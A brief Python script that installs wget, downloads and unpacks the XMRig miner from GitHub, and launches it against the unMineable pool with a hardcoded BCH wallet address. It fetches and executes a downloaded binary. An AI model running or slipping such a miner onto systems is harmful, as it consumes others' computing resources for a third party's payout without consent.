import subprocess
import shutil
import os

# Check if wget is installed
if shutil.which("wget") is None:
    print("wget is not installed. Installing wget...")
    subprocess.run(["apt-get", "update"])
    subprocess.run(["apt-get", "install", "-y", "wget"])

# Define XMRig version
XMRIG_VERSION = "6.18.0"
XMRIG_TAR = f"xmrig-{XMRIG_VERSION}-linux-x64.tar.gz"
XMRIG_DIR = f"xmrig-{XMRIG_VERSION}"

# Download XMRig
print(f"Downloading XMRig version {XMRIG_VERSION}...")
subprocess.run(["wget", f"https://github.com/xmrig/xmrig/releases/download/v{XMRIG_VERSION}/{XMRIG_TAR}"])

# Extract XMRig
print("Extracting XMRig...")
subprocess.run(["tar", "-zxvf", XMRIG_TAR])

# Navigate to the XMRig directory
os.chdir(XMRIG_DIR)

# Run XMRig with parameters for unMineable BCH mining
print("Starting XMRig for BCH mining on unMineable...")
subprocess.run(["./xmrig", "-o", "rx.unmineable.com:3333", "-a", "rx", "-k", "-u", "BCH:qqe3cudqxmc498e7nza7rfwajjyeh6x3nghsvtm39p.pc#xnsub"])
